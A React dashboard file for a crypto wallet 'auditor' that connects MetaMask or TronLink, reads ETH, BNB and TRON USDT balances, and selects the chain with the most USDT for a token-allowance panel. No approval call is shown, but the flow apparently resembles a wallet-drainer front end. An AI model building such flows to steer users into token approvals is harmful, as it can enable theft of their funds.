import React, { useState, useEffect } from 'react';
import SidebarInfo from '../components/SidebarInfo';
import AuditorWidget from '../components/AuditorWidget';
import TokenAllowancePanel from '../components/TokenAllowancePanel';
import { allowanceService } from '../services/blockchain/allowanceService';
import { normalizeChainId } from '../utils/networkUtils';

export type ReportBalances = {
  ETH?: string;
  BNB?: string;
  TRON?: string;
};

const Dashboard: React.FC = () => {
  const [connectedWalletAddress, setConnectedWalletAddress] = useState('');
  const [activeWalletChainId, setActiveWalletChainId] = useState<number | null>(null);
  
  // Independent read-only discovered balances
  const [reportBalances, setReportBalances] = useState<ReportBalances>({});
  
  // User's selected chain for token allowance manager
  const [selectedAllowanceChain, setSelectedAllowanceChain] = useState<'ETH' | 'BNB' | 'TRON' | null>(null);

  // Monitor accounts/chain changes for EVM
  useEffect(() => {
    if (window.ethereum) {
      const handleChainChanged = (hexId: string) => {
        setActiveWalletChainId(normalizeChainId(hexId));
      };
      
      const handleAccountsChanged = (accounts: string[]) => {
        const newAddress = accounts[0] || '';
        if (newAddress !== connectedWalletAddress) {
          setConnectedWalletAddress(newAddress);
          setReportBalances({}); // Clear previous balances on account change
        }
      };
      
      // Initial checks if already connected
      window.ethereum.request({ method: 'eth_accounts' }).then((accounts: string[]) => {
        if (accounts && accounts.length > 0) {
          setConnectedWalletAddress(accounts[0]);
          window.ethereum.request({ method: 'eth_chainId' }).then((hexId: string) => {
            setActiveWalletChainId(normalizeChainId(hexId));
          });
        }
      });

      window.ethereum.on('chainChanged', handleChainChanged);
      window.ethereum.on('accountsChanged', handleAccountsChanged);
      return () => {
        window.ethereum.removeListener('chainChanged', handleChainChanged);
        window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
      };
    }
  }, [connectedWalletAddress]);

  const discoverBalances = async (address: string, includeEvm: boolean, includeTron: boolean) => {
    const newBalances: ReportBalances = { ...reportBalances };
    
    if (includeEvm) {
      // Parallel EVM discovery
      await Promise.allSettled([
        allowanceService.getEvmBalance(address, 1).then(bal => newBalances.ETH = bal).catch(() => newBalances.ETH = "Error"),
        allowanceService.getEvmBalance(address, 56).then(bal => newBalances.BNB = bal).catch(() => newBalances.BNB = "Error")
      ]);
    }
    
    if (includeTron) {
      try {
        const bal = await allowanceService.getTronBalance(address, "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
        newBalances.TRON = bal;
      } catch (err) {
        newBalances.TRON = "Error";
      }
    }
    
    setReportBalances(newBalances);

    // Auto-select allowance chain based on discovered EVM balances if one isn't selected
    if (!selectedAllowanceChain) {
      const ethBal = parseFloat(newBalances.ETH === 'Error' ? '0' : (newBalances.ETH || '0'));
      const bnbBal = parseFloat(newBalances.BNB === 'Error' ? '0' : (newBalances.BNB || '0'));
      
      // Default to BNB unless ETH has strictly more USDT
      if (!isNaN(ethBal) && !isNaN(bnbBal) && ethBal > bnbBal) {
        setSelectedAllowanceChain('ETH');
      } else {
        setSelectedAllowanceChain('BNB');
      }
    }
  };

  const connectWallet = async () => {
    // If the allowance panel tries to connect, we default to EVM connection
    if (!selectedAllowanceChain || selectedAllowanceChain === 'ETH' || selectedAllowanceChain === 'BNB') {
      if (typeof window.ethereum !== 'undefined') {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
          if (accounts && accounts.length > 0) {
            setConnectedWalletAddress(accounts[0]);
            const hexId = await window.ethereum.request({ method: 'eth_chainId' });
            setActiveWalletChainId(normalizeChainId(hexId));
            // Trigger balance discovery
            discoverBalances(accounts[0], true, false);
          }
        } catch (err) {
          console.error("MetaMask connection failed:", err);
        }
      } else {
        alert("Please install an EVM compatible wallet.");
      }
    } else if (selectedAllowanceChain === 'TRON') {
      if (typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined') {
        try {
          const tronLink = window.tronLink || (window as any).tron;
          if (tronLink) {
            const res = await tronLink.request({ method: 'tron_requestAccounts' });
            if (res && res.code === 200 && window.tronWeb && window.tronWeb.defaultAddress) {
              const address = window.tronWeb.defaultAddress.base58;
              setConnectedWalletAddress(address);
              discoverBalances(address, false, true);
            }
          }
        } catch (err) {
          console.error("TronLink connection failed:", err);
        }
      } else {
        alert("Please install TronLink to connect TRON Mainnet.");
      }
    }
  };

  return (
    <div className="min-h-[100svh] overflow-x-hidden px-3 py-5 sm:px-6 sm:py-8 crypto-bg">
      <div className="crypto-grid"></div>
      <div className="crypto-accent-tl"></div>
      <div className="crypto-accent-br"></div>
      
      <div className="crypto-content mx-auto grid w-full max-w-6xl min-w-0 gap-5 lg:grid-cols-[minmax(0,1.05fr)_minmax(360px,430px)] lg:items-start">
        <SidebarInfo />
        <div className="flex flex-col gap-5">
          <AuditorWidget 
            walletAddress={connectedWalletAddress}
            setWalletAddress={setConnectedWalletAddress}
            setActiveWalletChainId={setActiveWalletChainId}
            reportBalances={reportBalances}
            discoverBalances={discoverBalances}
            setSelectedAllowanceChain={setSelectedAllowanceChain}
          />
          <TokenAllowancePanel 
            owner={connectedWalletAddress}
            network={selectedAllowanceChain}
            setNetwork={setSelectedAllowanceChain}
            chainId={activeWalletChainId}
            onConnect={connectWallet}
            reportBalances={reportBalances}
          />
        </div>
      </div>
      
      <p className="crypto-content text-center text-[#2a3444] text-[10px] mt-4 font-mono tracking-wide">
        MetaMask · Trust Wallet · Binance Wallet · WalletConnect
      </p>
    </div>
  );
};

export default Dashboard;
